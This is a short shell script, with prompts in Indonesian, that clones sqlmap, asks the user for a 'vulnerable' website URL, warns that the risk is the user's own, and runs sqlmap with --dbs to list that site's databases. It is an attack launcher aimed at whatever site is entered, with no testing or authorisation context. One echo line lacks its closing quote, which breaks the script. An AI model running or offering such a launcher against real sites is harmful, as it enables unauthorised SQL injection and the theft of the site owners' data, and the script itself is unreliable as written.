echo "Installing SQL MAP"
git clone https://github.com/sqlmapproject/sqlmap
cd sqlmap
clear
echo "[+] Masukan Web vulnerable SQLi : "
read -p "Input : " menu;
sleep 1
clear
echo "Memulai .."
echo "[!] Resiko tanggung sendiri [!]
sleep 1
clear
python2 sqlmap.py -u $menu --dbs
